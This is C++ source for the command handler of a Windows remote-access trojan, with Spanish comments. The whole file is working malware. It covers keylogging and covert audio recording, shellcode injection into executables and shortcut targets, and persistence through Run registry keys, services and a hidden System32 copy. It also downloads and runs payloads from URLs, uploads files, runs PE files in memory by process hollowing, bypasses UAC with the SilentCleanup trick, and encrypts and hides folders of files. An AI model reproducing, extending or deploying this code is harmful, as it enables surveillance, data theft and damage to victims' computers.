#include "commands.h"
#include <urlmon.h>
#include <WinUser.h>
#pragma comment(lib, "urlmon.lib")


using namespace std;

void COMMANDS::set_length_cmd(DWORD length) {
	_length_command = length;
}
void COMMANDS::set_is_downloading(BOOL boole) {
	_is_downloading = boole;
}
void COMMANDS::set_is_uploading(BOOL boole) {
	_is_uploading = boole;
}
int COMMANDS::get_file_size_up() {
	return _file_size_up;
}
char* COMMANDS::get_cipherKey() {
	return _cipher_key;
}
BOOL COMMANDS::get_is_uploading() {
	return _is_uploading;
}
char* COMMANDS::set_cipherKey(char* cipher_key) {
	if (strlen(cipher_key) < 8)
		return KEY_NEEDED;
	_cipher_key = cipher_key;
	return CORRECT;
}


char* COMMANDS::exec(LPVOID command_bfr) {
	if (_is_downloading) {
		save_data(command_bfr);
		return NOTHING;
	} 

	//ZeroMemory(&command, sizeof(int));
	char* second_parameter = strchr((char*)command_bfr, ' ');
	char nul = '\0';
	char* pos_salto = strchr((char*)command_bfr, '\n'); // Busca el salto de linea del final

	if (pos_salto != NULL)
		memcpy(pos_salto, &nul, 1); //cambia el salto de linea por un null

	if (second_parameter != NULL) {
		memcpy(second_parameter, &nul, 1); //Cambiamos el espacio por un caracter nulo para que se copie en el comando solo el primer paramero (el numero)
		second_parameter = second_parameter + 1;
	}
	int c = atoi((char*)command_bfr);
	
	char* response = UNKNOWN;
	
	switch (c) {
	case 101: { //Comienza el keylogger
		response = keylogger_start(second_parameter); //(Absolute)Path del archivo donde se guardar� la info
		break;
	}
	case 102: { //Chekea si el keylogger funciona
		response = keylogger_alive();
		break;
	}
	case 103: { //Para el keylogger funciona
		response = keylogger_stop();
		break;
	}

	case 104: { //Comienza a grabar audio
		response = audio_start(second_parameter); //(Absolute)Path del archivo donde se guardar� la info
		break;
	}
	case 105: { //Chekea si esta activada la grabacion de audio
		response = audio_alive();
		break;
	}
	case 106: { //Para la grabacion de audio
		response = audio_stop();
		break;
	}		  
		  
	case 111: { //Infecta un code cave DE UN ARCHIVO con una shellcode (incluyendo los originales de accesos directos)
		response = infect_file(second_parameter, FALSE);
		break;
	}
	case 112: { //Infecta un code cave de los ejecutables de un archivos con una shellcode (incluyendo los originales de accesos directos)
		response = infect_folder(second_parameter, FALSE);
		break; 
	}

	case 121: { // Escribe en el registro Run de Current User para ganar persistencia
		response = persis_runRegistry(second_parameter); //Nombre de la nueva clave, por defecto FAKE_NAME
		break;
	}
	case 122: { // Escribe en el registro WOW64 Run de Current User para ganar persistencia
		response = persis_runW64Registry(second_parameter); //Nombre de la nueva clave, por defecto FAKE_NAME
		break;
	}
	case 123: { // Escribe la direcci�n el ejectable en el registro de HKLM que se le de
		response = persis_anyRegistryLM(second_parameter); //Need privileges, sub kay ej: SOFTWARE\Microsoft\Windows\CurrentVersion\Run2
		break;
	}
	case 124: { //Crea un servicio
		response = persis_service(second_parameter); //Need privileges
		break;
	}
	case 125: { //Guarda el malware como un archivo en System 32 con sufijo .com (SUPLANTA A OTRO)
		response = persis_path_system32(second_parameter); //Need privileges, nombre del servicio, por defecto FAKE_NAME
		break;
	}

	case 131: {//Download to memory
		response = download_to_memory(second_parameter);  //Need the length of the file to be downloaded
		break;
	}
	case 132: { //Download to Disk Directly
		response = download_to_memory(second_parameter); //Download to memory and then to disk
		if (response == CORRECT) {
			_is_downloading_disk = TRUE; //Posteriormente se guardan todos los datos con save_data y desde save_data se lanza download_to_disk
			response = NOTHING;
		}
		break;
	}
	case 133: { //Download what is in memory to disk
		response = download_to_disk(); //Save in disk which is in memory
		break;
	}
	case 134: { //Descarga a disco desde internet
		response = download_file(second_parameter); //Descarga la url en DOWNLOAD_FILE, se necesita url con protocolo (http://ETC..)
		break;
	}
	case 135: { //Clean the file downloaded 
		free_virtual_alloc();
		_pAlloc_fileIni = NULL;
		response = CORRECT;
		break;
	}
	case 136: { //Env�a un archivo
		response = upload(second_parameter);
		break;
	}

	case 141: { //Ejecuta el PE guardado en memoria
		response = runPE_memory(second_parameter); //Hay que pasarle el programa que va a lenvantar de forma falsa y va a rellenar con nuestro c�digo, por defecto levanta otra instancia del malware
		break;
	}
	case 142: { //Ejecuta un archivo en otro proceso
		response = execute_file_other_process(second_parameter); //Necesita PATH ABSOLUTO
		break;
	}

	case 151: { //Escalar privilegios usando SilentClean
		response = escalation_SilentCleanup(second_parameter);
		break;
	}

	case 201: { //Cifrado de un archivo con byteInversion
		response = cypher_file_byteInversion(second_parameter); //Path al archivo a cifrar
		break;
	}
	case 202: { //Cifrado de archivos de carpeta con rc4
		response = cypher_files_in_folder_byteInversion(second_parameter); //Path de la carpeta a cifrar
		break;
	}
	case 203: { //Cifrado de un archivo con byteCycle
		response = cypher_file_byteCycle(second_parameter); //Path al archivo a cifrar
		break;
	}
	case 204: { //Cifrado de archivos de carpeta con byteCycle
		response = cypher_files_in_folder_byteCycle(second_parameter); //Path de la carpeta a cifrar
		break;
	}
	case 205: { //Pone la clave de cifrado
		response = set_cipherKey(second_parameter); //Setear clave cifrado 8 digitos minimo
		break;
	}
	case 206: { //Limpia la clave de cifrado
		_cipher_key = NULL;
		response = CORRECT;
		break;
	}
	case 207: { //Cifrado de un archivo con rc4
		response = cypher_file_rc4(second_parameter); //Path al archivo a cifrar
		break;
	}
	case 208: { //Cifrado de archivos de carpeta con rc4
		response = cypher_files_in_folder_rc4(second_parameter); //Path de la carpeta a cifrar
		break;
	}

	case 211: {
		response = infiniteLoop_pi_dec();
		break;
	}

	case 221: { //Cambia el fondo de escritorio
		response = change_wallpaper(second_parameter);
		break;
	}
	case 222: { //Esconde la barra de abajo de windows
		response = hide_ppal_icons();
		break;
	}
	case 223: { //Esconde un archivo
		response = hide_file(second_parameter);
		break;
	}
	case 224: { // Esconde los archivos de una carpeta
		response = hide_files_in_folder(second_parameter); //Tamben esconde la carpeta
		break;
	}
	case 225: { //infecta un archivo con una parte de una shell que detecta el antivirus
		response = infect_file(second_parameter, TRUE); 
		break;
	}
	case 226: { //infecta una carpeta con una parte de una shell que detecta el antivirus
		response = infect_folder(second_parameter, TRUE);
		break;
	}
	case 227: { //Cambia la hora X a�os al futuro, Requiere privilegios
		response = go_X_years_to_the_future(second_parameter);
		break;
	}
	case 228: { //Cambia la hora X a�os al pasado, Requiere privilegios
		response = go_X_years_to_the_past(second_parameter);
		break;
	}
	/*case 219: {
		response = share_HD_smb();
		break;
	}*/

	

	case 999: {
		ExitProcess(0);
	}
			  /*
	case 5: {
		response = dllInjection_5();
		break;
	}
	case 6: {
		response = spy_6();
		break;
	}
	}lazagne, mimikatz, PTHToolkit, pwdump*/
	}
	return response;
}

char*  COMMANDS::keylogger_start(char* location) {
	HANDLE hThread1 = CreateThread(NULL, NULL, Keylogger_main, location, NULL, &_keyThreadID);
	_running_keylogger = TRUE;
	return CORRECT;
}
char*  COMMANDS::keylogger_alive() {
	/*HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, NULL, keyThreadID);
	LPDWORD lpExitCode = NULL;
	if (GetExitCodeThread(hThread, lpExitCode) == STILL_ACTIVE)
		return RUNNING;*/
	if (_running_keylogger) {
		return RUNNING;
	}
	return NOT_RUNNING;
}
char*  COMMANDS::keylogger_stop() {
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, NULL, _keyThreadID);
	if (hThread != NULL) {
		if (TerminateThread(hThread, 0) != NULL) {
			_running_keylogger = FALSE;
			return CORRECT;
		}
	}return INCORRECT;
}


char*  COMMANDS::audio_start(char* location) {
	HANDLE hThread1 = CreateThread(NULL, NULL, audio_main, location, NULL, &_audioThreadID);
	_recording_audio = TRUE;
	return CORRECT;
}

char*  COMMANDS::audio_alive() {
	if (_recording_audio) {
		return RUNNING;
	}
	return NOT_RUNNING;
}

char*  COMMANDS::audio_stop() {  //se para la grabacion de audio mandando un key event de escape
	if (_recording_audio == TRUE) {
		keybd_event(VK_ESCAPE, 0, 0, 0); //KEY DOWN
		//Sleep(1000);
		//keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0); // KEY_UP
		_recording_audio = FALSE;
		return CORRECT;
	}
	return INCORRECT;
}


char* COMMANDS::infect_file(char* location, BOOL use_shell_detected) {
	if (location == NULL)
		return PARAMETER;
	char* response;
	if (strstr(location, ".lnk") != NULL)
		response = infect_link(location, use_shell_detected);
	else if (strstr(location, ".exe") != NULL) {
		if (!use_shell_detected && _pAlloc_fileIni == NULL)
			return NEED_SHELLCODE;
		response = infect_main(location, use_shell_detected, (const char*)_pAlloc_fileIni);
	}
	else
		response = INCORRECT;
	return response;
}
char* COMMANDS::infect_folder(char* location, BOOL use_shell_detected) {
	if (!use_shell_detected && _pAlloc_fileIni == NULL)
		return NEED_SHELLCODE;
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char ab_path[MY_MAX_PATH];
	char* response = INCORRECT;
	if (location == NULL)
		GetCurrentDirectoryA(MY_MAX_PATH, ab_path);
	else
		strcpy_s(ab_path, location);

	strcat_s(ab_path, "\\*");

	hFind = FindFirstFileA(ab_path, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE){
		do {
			ZeroMemory(ab_path, MY_MAX_PATH);
			strcpy_s(ab_path, location);
			strcat_s(ab_path, "\\");
			strcat_s(ab_path, FindFileData.cFileName);
			infect_file(ab_path, use_shell_detected);
			response = CORRECT;
			//printf("The first file found is %s\n", FindFileData.cFileName);
		} while (FindNextFileA(hFind, &FindFileData) != 0);
		FindClose(hFind);
	}
	return response;
}
char* COMMANDS::infect_link(char* location, BOOL use_shell_detected) {
	streampos size;
	char* pData;
	char* response = NO_PATH_DIRECT_ACCS;

	ifstream file((char*)location, ios::in | ios::binary | ios::ate); //Ate = Comienza al final
	if (file.is_open()) {
		size = file.tellg();
		pData = new char[size];
		file.seekg(0, ios::beg); file.read(pData, size); file.close();
		int i = 0;
		char* exe = ".exe"; // Busca si en el link hay algun ".exe"
		char* ini = ":\\"; //Busca el inicio de la direcci�n al ejecuable
		char* path;
		char* pIni;
		char* pExe = std::search(pData, pData + (int)size, exe, exe + strlen(exe));

		if (pExe < pData + (int)size)
		{
			//std::cout << "found Exe: " << pExe - pData << '\n';
			do {
				pIni = std::search(pData, pData + (int)size - i, ini, ini + strlen(ini));
				if (pIni > pExe) return response;

				i = pIni - pData + 1;
				pData = pData + i;
				//std::cout << "found Ini: " << ini << '\n';
				path = pIni - 1; // pIni apunta a :\ y asi vamos a C:\
				//cout << path << endl;
				//cout << "strlen path: " << strlen(path) << endl;
			} while (strlen(path) < 10);
			response = infect_file(path, use_shell_detected);
			return response;
		}
	} return response;
}

wstring from_str_to_wstr(string str) {
	int size = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstr(size, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size);
	return wstr;
}
char* writeInRegistry(char* val_name, LPCTSTR subkey, HKEY ppalKey) {
	if (val_name == NULL)
		val_name = FAKE_NAME;

	char* response = INCORRECT;
	HKEY hKey;
	char path[MY_MAX_PATH];
	GetModuleFileNameA(NULL, path, MY_MAX_PATH);
	if (RegCreateKeyEx(ppalKey, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS &&
		RegSetValueExA(hKey, val_name, 0, REG_SZ, (LPBYTE)path, MY_MAX_PATH) == ERROR_SUCCESS)
		response = CORRECT;
	RegCloseKey(hKey);
	return response;
}
char* COMMANDS::persis_runRegistry(char* val_name) {
	LPCTSTR subkey = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	return writeInRegistry( val_name, subkey, HKEY_CURRENT_USER);
}
char* COMMANDS::persis_runW64Registry(char* val_name) {
	LPCTSTR subkey = TEXT("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
	return writeInRegistry(val_name, subkey, HKEY_CURRENT_USER);
}
char* COMMANDS::persis_anyRegistryLM(char* subkey) {
	if (subkey == NULL)
		return PARAMETER;	
	return writeInRegistry(NULL, from_str_to_wstr(subkey).c_str(), HKEY_LOCAL_MACHINE);
}
char* create_a_service(LPCTSTR serviceName, LPCTSTR lpBinaryPathName) {
	char* response = INCORRECT;
	if (CreateService(OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE),
		serviceName, serviceName, SC_MANAGER_CREATE_SERVICE, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE, lpBinaryPathName, NULL, NULL, NULL, NULL, NULL) != NULL)
			response = CORRECT;
	return response;
}
char* COMMANDS::persis_service(char* serv_name){
	if (serv_name == NULL)
		serv_name = FAKE_NAME;
	wchar_t path[MY_MAX_PATH];
	GetModuleFileName(NULL, path, MY_MAX_PATH);
	return create_a_service(from_str_to_wstr(serv_name).c_str(), path);
}
char* COMMANDS::persis_path_system32(char* cmd_name) {
	if (cmd_name == NULL)
		cmd_name = FAKE_CMD;

	char final_path[MAX_PATH], path[MY_MAX_PATH], cmd_cpy[MAX_PATH];
	char com[] = ".com";
	char windir[] = "Windir";
	char sys32[] = "\\sysnative\\";//Para escribir en /System32 y no en /SysWOW64

	strcpy_s(cmd_cpy, MAX_PATH, cmd_name);
	strcat_s(cmd_cpy, MAX_PATH, com);
	
	GetEnvironmentVariableA(windir, final_path, MAX_PATH);
	strcat_s(final_path, MAX_PATH, sys32);
	strcat_s(final_path, MAX_PATH, cmd_cpy);

	GetModuleFileNameA(NULL, path, MY_MAX_PATH);
	if (CopyFileA(path, final_path, FALSE) != 0) { //Si el archivo ya existe, se sobreescribe
		SetFileAttributesA(final_path, FILE_ATTRIBUTE_HIDDEN); //Lo escondemos
		return CORRECT;
	}
	return INCORRECT;
}

void COMMANDS::free_virtual_alloc() {
	if (_pAlloc_fileIni != NULL)
		VirtualFree(_pAlloc_fileIni, _last_file_size_down, MEM_RELEASE);
}
void  COMMANDS::save_data(LPVOID data) {
	memcpy(_pAlloc_file, data, _length_command);
	_pAlloc_file = (BYTE*)_pAlloc_file + _length_command;
	if ((BYTE*)_pAlloc_file - (BYTE*)_pAlloc_fileIni >= _file_size_down) {
		_is_downloading = FALSE;
		if (_is_downloading_disk) {
			download_to_disk();
		}
	}	
}
char* COMMANDS::download_to_memory(char* file_length) {
	if (file_length == NULL)
		return PARAMETER;
	free_virtual_alloc();
	_is_downloading = TRUE;
	_file_size_down = atoi(file_length);
	_pAlloc_fileIni = VirtualAlloc(NULL, _file_size_down, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // PAGE_EXECUTE_READWRITE https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
	if (_pAlloc_fileIni == NULL)
		return INCORRECT;

	_last_file_size_down = _file_size_down;
	_pAlloc_file = _pAlloc_fileIni;
	return CORRECT;
}
char* COMMANDS::download_to_disk() {
	_is_downloading_disk = FALSE;
	ofstream outFile(DOWNLOAD_FILE, ios::out | ios::binary);
	if (outFile.is_open()) {
		outFile.write((char*)_pAlloc_fileIni, _file_size_down);
		outFile.close();
		return CORRECT;
	}
	return noOpen_msg;
}
char* COMMANDS::download_file(char* url) {
	if (URLDownloadToFileA(NULL, url, DOWNLOAD_FILE, NULL, NULL) == S_OK)
		return CORRECT;
	return INCORRECT;
}
char* COMMANDS::upload(char* location) {
	if (location == NULL)
		return PARAMETER;
	ifstream inFile(location, ios::in | ios::binary | ios::ate);
	if (inFile.is_open()) {
		int size = inFile.tellg();
		char* pDataUp = new char[size];
		inFile.seekg(0, ios::beg);
		inFile.read(pDataUp, size);
		inFile.close();
		_file_size_up = size;
		_is_uploading = TRUE;
		return pDataUp;
	}
	return noOpen_msg;
}

char* COMMANDS::runPE_memory(char* fake_program) {
	if (_pAlloc_fileIni == NULL)
		return NEED_EXECUTABLE;
	if (fake_program == NULL) {
		char path[MY_MAX_PATH];
		GetModuleFileNameA(NULL, path, MY_MAX_PATH);
		fake_program = path;
	}
	if (runPE_main(_pAlloc_fileIni, fake_program) == 0)
		return CORRECT;
	return INCORRECT;
}
char* COMMANDS::execute_file_other_process(char* location) {
	if (location == NULL)
		return PARAMETER;
	PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	STARTUPINFOA sui; ZeroMemory(&sui, sizeof(STARTUPINFO));

	if (CreateProcessA(location, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi) != 0)
		return CORRECT;
	cout << GetLastError() << endl;
	return INCORRECT;
}

char* COMMANDS::escalation_SilentCleanup(char* port) {
	if (port == NULL)
		return PARAMETER;
	/*reg add hkcu\Environment /v windir /d "C:\Users\carlos\Desktop\PEview.exe & reg delete hkcu\Environment /v windir /f && REM " & schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I*/
	/*/C reg add hkcu\Environment /v windir /d "\"C:\Users\carlos\Documents\Visual Studio 2015\Projects\Malware\Debug\Malware.exe 9999 & reg delete hkcu\Environment /v windir /f && REM " & schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I*/
	char file_name[MY_MAX_PATH], cmd1 [MY_MAX_PATH]; //"/C reg add hkcu\Environment /v windir /d \"C:\\Users\\carlos\\Desktop\\PEview.exe & reg delete hkcu\Environment / v windir / f && REM \" & schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
	GetModuleFileNameA(NULL, file_name, MY_MAX_PATH);

	strcpy_s(cmd1, MY_MAX_PATH, "/C reg add hkcu\\Environment /v windir /d \"\\\"");
	strcat_s(cmd1, MY_MAX_PATH, file_name);
	strcat_s(cmd1, MY_MAX_PATH, "\\\" ");
	strcat_s(cmd1, MY_MAX_PATH, port);
	strcat_s(cmd1, MY_MAX_PATH, " && REM \"");
	
	if ((int)ShellExecuteA(0, "open", "cmd.exe", cmd1, 0, SW_HIDE) > 32) 
		if( (int)ShellExecuteA(0, "open", "cmd.exe", "/C schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I", 0, SW_HIDE) > 32)
			if ((int)ShellExecuteA(0, "open", "cmd.exe", "/C timeout 2 & reg delete hkcu\\Environment /v windir /f", 0, SW_HIDE) > 32)
				return CORRECT;
	return INCORRECT;
}

char* COMMANDS::cypher_file_byteInversion(char* location) {
	if (location == NULL)
		return PARAMETER;
	int resp = three_cip_types(1, location, NULL);
	if (resp == 0)
		return CORRECT;
	return INCORRECT;
}
char* COMMANDS::cypher_files_in_folder_byteInversion(char* location) {
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char* response = INCORRECT;
	char ab_path[MY_MAX_PATH];
	if (location == NULL)
		GetCurrentDirectoryA(MY_MAX_PATH, ab_path);
	else
		strcpy_s(ab_path, location);

	strcat_s(ab_path, "\\*");

	hFind = FindFirstFileA(ab_path, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			ZeroMemory(ab_path, MY_MAX_PATH);
			strcpy_s(ab_path, location);
			strcat_s(ab_path, "\\");
			strcat_s(ab_path, FindFileData.cFileName);
			cypher_file_byteInversion(ab_path);
			response = CORRECT;
			//printf("The first file found is %s\n", FindFileData.cFileName);
		} while (FindNextFileA(hFind, &FindFileData) != 0);
		FindClose(hFind);
	}
	return response;
}
char* COMMANDS::cypher_file_byteCycle(char* location) {
	if (location == NULL)
		return PARAMETER;
	int resp = three_cip_types(2, location, NULL);
	if (resp == 0)
		return CORRECT;
	return INCORRECT;
}
char* COMMANDS::cypher_files_in_folder_byteCycle(char* location) {
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char* response = INCORRECT;
	char ab_path[MY_MAX_PATH];
	if (location == NULL)
		GetCurrentDirectoryA(MY_MAX_PATH, ab_path);
	else
		strcpy_s(ab_path, location);

	strcat_s(ab_path, "\\*");

	hFind = FindFirstFileA(ab_path, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			ZeroMemory(ab_path, MY_MAX_PATH);
			strcpy_s(ab_path, location);
			strcat_s(ab_path, "\\");
			strcat_s(ab_path, FindFileData.cFileName);
			cypher_file_byteCycle(ab_path);
			response = CORRECT;
			//printf("The first file found is %s\n", FindFileData.cFileName);
		} while (FindNextFileA(hFind, &FindFileData) != 0);
		FindClose(hFind);
	}
	return response;
}
char* COMMANDS::cypher_file_rc4(char* location) {
	if (location == NULL)
		return PARAMETER;
	if (_cipher_key == NULL)
		return KEY_NEEDED;
	int resp = three_cip_types(4, location, get_cipherKey());
	if (resp == 0)
		return CORRECT;
	return INCORRECT;
}
char* COMMANDS::cypher_files_in_folder_rc4(char* location) {
	if (_cipher_key == NULL)
		return KEY_NEEDED;
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char* response = INCORRECT;
	char ab_path[MY_MAX_PATH];
	if (location == NULL)
		GetCurrentDirectoryA(MY_MAX_PATH, ab_path);
	else
		strcpy_s(ab_path, location);

	strcat_s(ab_path, "\\*");

	hFind = FindFirstFileA(ab_path, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			ZeroMemory(ab_path, MY_MAX_PATH);
			strcpy_s(ab_path, location);
			strcat_s(ab_path, "\\");
			strcat_s(ab_path, FindFileData.cFileName);
			cypher_file_rc4(ab_path);
			response = CORRECT;
			//printf("The first file found is %s\n", FindFileData.cFileName);
		} while (FindNextFileA(hFind, &FindFileData) != 0);
		FindClose(hFind);
	}
	return response;
}

char* COMMANDS::infiniteLoop_pi_dec() {
	if (CreateThread(NULL, NULL, pi_dec, NULL, NULL, NULL) != NULL)
		return CORRECT;
	return INCORRECT;
}

char* COMMANDS::change_wallpaper(char* url) {
	if (url == NULL)
		return PARAMETER;
	if (download_file(url) == CORRECT) {
		//const wchar_t *filenm = L"C:\\Users\\carlos\\Desktop\\download.jpeg"; //ADDRESS of first image
		char currentdir[MY_MAX_PATH];
		char barra[] = "\\";
		GetCurrentDirectoryA(MY_MAX_PATH, currentdir);
		strcat_s(currentdir, MY_MAX_PATH, barra);
		strcat_s(currentdir, MY_MAX_PATH, DOWNLOAD_FILE);
		bool isWallSet = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)currentdir, SPIF_UPDATEINIFILE);
		if (isWallSet != 0) {
			return CORRECT;
		}
	}
	return INCORRECT;
}
char* COMMANDS::hide_ppal_icons(){
	HWND hStartBtn = FindWindowEx(NULL, NULL, MAKEINTATOM(0xC017), TEXT("Start"));
	if (hStartBtn != NULL)
	{
		ShowWindow(hStartBtn, FALSE);
	}
	ShowWindow(FindWindow(L"Shell_TrayWnd", L""), SW_HIDE);
	RemoveMenu(GetSystemMenu(GetConsoleWindow(), FALSE), SC_CLOSE, MF_GRAYED);
	DrawMenuBar(GetConsoleWindow());
	return CORRECT;
}
char* COMMANDS::hide_file(char* location) {
	if (location == NULL)
		return PARAMETER;
	if (SetFileAttributesA(location, FILE_ATTRIBUTE_HIDDEN) != 0)
		return CORRECT;
	return INCORRECT;
}
char* COMMANDS::hide_files_in_folder(char* location) {
	WIN32_FIND_DATAA FindFileData;
	HANDLE hFind;
	char* response = INCORRECT;
	char ab_path[MY_MAX_PATH];
	if (location == NULL)
		GetCurrentDirectoryA(MY_MAX_PATH, ab_path);
	else
		strcpy_s(ab_path, location);

	strcat_s(ab_path, "\\*");

	hFind = FindFirstFileA(ab_path, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			ZeroMemory(ab_path, MY_MAX_PATH);
			strcpy_s(ab_path, location);
			strcat_s(ab_path, "\\");
			strcat_s(ab_path, FindFileData.cFileName);
			hide_file(ab_path);
			response = CORRECT;
			//printf("The first file found is %s\n", FindFileData.cFileName);
		} while (FindNextFileA(hFind, &FindFileData) != 0);
		FindClose(hFind);
	}
	return response;
}
char* COMMANDS::go_X_years_to_the_future(char* years) {
	if (years == NULL)
		return PARAMETER;
	int years_int = atoi(years);
	SYSTEMTIME st;
	GetSystemTime(&st);
	st.wYear = st.wYear + years_int;
	if (SetSystemTime(&st) == 0)
		return INCORRECT;
	return CORRECT;
}
char* COMMANDS::go_X_years_to_the_past(char* years) {
	if (years == NULL)
		return PARAMETER;
	int years_int = atoi(years);
	SYSTEMTIME st;
	GetSystemTime(&st);
	st.wYear = st.wYear - years_int;
	if (SetSystemTime(&st) == 0)
		return INCORRECT;
	return CORRECT;
}


/*char* COMMANDS::share_HD_smb() {
	if ((int) ShellExecuteA(0, "open", "cmd.exe", "/C net share DS=C:\\ /unlimited /cache:automatic /remark:\"Remote Hard Drive Administration\"", 0, SW_HIDE) > 32)
		return CORRECT;
	return INCORRECT;
}*/

